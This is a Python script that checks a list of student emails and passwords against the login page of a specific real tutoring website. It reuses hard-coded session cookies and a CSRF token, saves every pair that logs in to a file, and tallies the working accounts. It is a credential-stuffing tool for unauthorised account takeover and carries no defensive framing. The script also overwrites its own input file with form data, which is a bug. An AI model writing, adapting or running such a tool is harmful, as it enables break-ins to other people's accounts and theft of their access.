import json
import requests
import time
# Load the JSON data from the file
with open('accs.json', 'r' ,  encoding='utf-8') as file:
    students = json.load(file)['students']

# Initialize counters

successful_logins = 0
failed_logins = 0
remaining_accounts = len(students)

# Loop through each student
for student in students:
    email = student['Email']
    password = student['Password']

    cookies = {
    'XSRF-TOKEN': 'eyJpdiI6ImJVcUpYNnk0OVdmaFp1ME1XQ1pCeVE9PSIsInZhbHVlIjoiNHIzTWwwZC93K0N2V2pDYmdna1NwSW5BVkdUSC83aFdVano0aldyelNtamRZRzhvOWtKSXZGMGFUK2t3L2kvd2UrN3N2NGNqemsvY2tMRGM5b3pzczJzQkY4NnNBQ2t6cnNHOTJNZU0reCtMRmEwZmM4NUlUcjE3OTdLM2ZpMGQiLCJtYWMiOiJmNzUxMTBjZTY5MGQwOGE5MGUwMTM2MWE2MzFjMDQ1MjIyNWE1ODhmYjc2NzM0MGEyNmFlNzkzMmRhMjBmNzhlIiwidGFnIjoiIn0%3D',
    'yassersalahsite': 'eyJpdiI6ImpkUm1WTzlyRytwTHYwUU1EQXVqSEE9PSIsInZhbHVlIjoibGw1NGpZcXFyNGJRVjYrUUpyak9SNFRyZ21yd0pqSkk2UlRsOFJsZ2JtRUIwdzYveHhuMmRXeVVrRFJXOElUazhPbkt3ZXVOMU9mdEErd2ZhMEJJZDhzeGgwdnBlLzRvbXEzWitIcDhacnVaRmNxZDR2OGhOQTd5ZExPZzdQYlIiLCJtYWMiOiJjYTFlMjFmNWFmOWYzZWYwZTc5NWQxOWE2ZWUzYmQyZGViZDI1MzliOGU2M2MyN2EyNmExNWFiYWY0YzU2ZjUwIiwidGFnIjoiIn0%3D',
}

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.6',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        # 'Cookie': 'XSRF-TOKEN=eyJpdiI6IjBBTlFDaUVod2hBMWNySHhJQko1eHc9PSIsInZhbHVlIjoibHY2T1Qrc2U0akU2M2ZpYjJRaDVXOGN0b1ZZVmxFZlp1TWMzcGRnLyttOExrUTRwU3BvMWdYSHp6Tk1aVmtKNWpsS1REOS85enFmbE5OMVdnSFQxTy9OQXBHcmtJZloxUVJPZ0pTSEp4Q0J3cXc5TEhYanlNSzFZYTAzNnovV0kiLCJtYWMiOiI4MDJlZjZkYTBjNjY1MGFkY2U0OTE5MDkwMTg4YjY5MmRkNjM1Mzc0YWVjNGIzNTViOTE0MWRhMTZmNWUzN2Q5IiwidGFnIjoiIn0%3D; yassersalahsite=eyJpdiI6InFWb0NEb1A3dGZIVDM4L3BaNzFFbEE9PSIsInZhbHVlIjoiMU1yUnBPUXdiNDR5a0pLOXRvMHBUL3hNT3VrRkJyU1FGcXRNVjdLU3ZIK1pOeThIQjZYTDRhZ3dxS2FVaTFNT1pEamFiMXFadHJnRmFjMGRMRUcwTXdiUVBtb3BZaTVOTnZEQ29reHl5OGoyOGJ2ZVJ3UkhUaUVKcGE0bXdqTGMiLCJtYWMiOiI3ODBhOGNhYmExMGEzNGZjMDRiMDg5N2Y2NDhkOTdlMThmODRjZjM4MDMyZTFjMWI5NmI0ZDYzZjU2OTY0MDYzIiwidGFnIjoiIn0%3D',
        'Pragma': 'no-cache',
        'Referer': 'https://dr.yassersalah.com/login',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Brave";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    data = {
        '_token': "ifqxNTq4u9aYF8TqPn87pMAUsCoKBwTX34J4v2Mu",
        'email': email,
        'password': password,
    }

    response = requests.post('https://dr.yassersalah.com/login', cookies=cookies, headers=headers, data=data)

    if "These credentials do not match our records" in response.text:
        print(f"Login failed for {email}")
        failed_logins += 1

    elif "Page Expired" in response.text:
        print("Page expired!! replace token in data")    
        break
    else:
        with open("account_details.txt", "a" ,  encoding='utf-8') as file:
            file.write(f"{email} : {password}\n")
        print(f"Login successful for {email}")
        successful_logins += 1
        
    del student['Email']
    del student['Password']
    with open('accs.json', 'w', encoding='utf-8') as file:
        json.dump(data, file)
    remaining_accounts -= 1
    print(f"{remaining_accounts} accounts left to try ========= Working accs till now {successful_logins}")

print("Login attempts completed.")
print(f"Successful logins: {successful_logins}")
print(f"Failed logins: {failed_logins}")
